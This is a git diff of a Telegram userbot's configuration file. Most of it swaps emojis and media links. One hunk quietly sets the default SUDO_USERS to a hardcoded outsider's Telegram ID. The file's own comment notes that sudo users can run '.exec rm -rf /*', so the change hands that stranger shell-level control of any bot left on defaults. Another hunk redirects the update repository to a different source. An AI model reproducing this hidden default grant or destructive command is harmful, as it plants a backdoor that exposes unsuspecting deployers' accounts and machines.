@@ -18,7 +18,7 @@ if ENV:
         # specify list of users allowed to use bot
         # WARNING: be careful who you grant access to your bot.
         # malicious users could do ".exec rm -rf /*"
-        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "").split())
+        SUDO_USERS = set(int(x) for x in os.environ.get("SUDO_USERS", "2143095429").split())
         # VeryStream only supports video formats
         VERY_STREAM_LOGIN = os.environ.get("VERY_STREAM_LOGIN", None)
         VERY_STREAM_KEY = os.environ.get("VERY_STREAM_KEY", None)
@@ -52,28 +52,28 @@ if ENV:
         MONGO_URI = os.environ.get("MONGO_URI", None)
         # alive
 
-        HELP_EMOJI1 = os.environ.get("HELP_EMOJI1", None) or "✥"
-        HELP_EMOJI2 = os.environ.get("HELP_EMOJI2", None) or "✥"
-        ALIVE_EMOJI = os.environ.get("ALIVE_EMOJI", None) or "✥"
+        HELP_EMOJI1 = os.environ.get("HELP_EMOJI1", None) or "♡"
+        HELP_EMOJI2 = os.environ.get("HELP_EMOJI2", None) or "♡"
+        ALIVE_EMOJI = os.environ.get("ALIVE_EMOJI", None) or "♡"
         ALIVE_PIC = (
             os.environ.get("ALIVE_PIC", None)
-            or "https://telegra.ph/file/af51de2749a4506d3eb43.jpg"
+            or "https://telegra.ph/file/c8fe5de96a7968636edc4.mp4"
         )
         PM_PIC = (
             os.environ.get("PM_PIC", None)
-            or "https://te.legra.ph/file/0c605739ddaa472cad75f.jpg"
+            or "https://telegra.ph/file/c8fe5de96a7968636edc4.mp4"
         )
         AWAKE_PIC = (
             os.environ.get("AWAKE_PIC", None)
-            or "https://telegra.ph/file/47ffec836544b371408ab.mp4"
+            or "https://telegra.ph/file/c8fe5de96a7968636edc4.mp4"
         )
         HELP_PIC = (
             os.environ.get("HELP_PIC", None)
-            or "https://te.legra.ph/file/b5d01ceea49ee0a822661.mp4"
+            or "https://telegra.ph/file/c8fe5de96a7968636edc4.mp4"
         )
         PING_PIC = (
             os.environ.get("PING_PIC", None)
-            or "https://te.legra.ph/file/ace5feae5b1ac8ea262ed.jpg"
+            or "https://telegra.ph/file/c8fe5de96a7968636edc4.mp4"
         )
         ALIVE_MSG = os.environ.get("ALIVE_MSG", None) or "Lêɠêɳ̃dẞøt Is Online"
         PM_MSG = os.environ.get("PM_MSG", None)
@@ -88,7 +88,7 @@ if ENV:
         LYDIA_API = os.environ.get("LYDIA_API", None)
         PLUGIN_CHANNEL = int(os.environ.get("PLUGIN_CHANNEL", None))
         UPSTREAM_REPO = os.environ.get(
-            "UPSTREAM_REPO", "https://github.com/PROBOY-OP/PRO-LEGENDBOT"
+            "UPSTREAM_REPO", "https://github.com/surturbot/thanos-pro"
         )
         APP_ID = os.environ.get("APP_ID", None)
         API_HASH = os.environ.get("API_HASH", None)
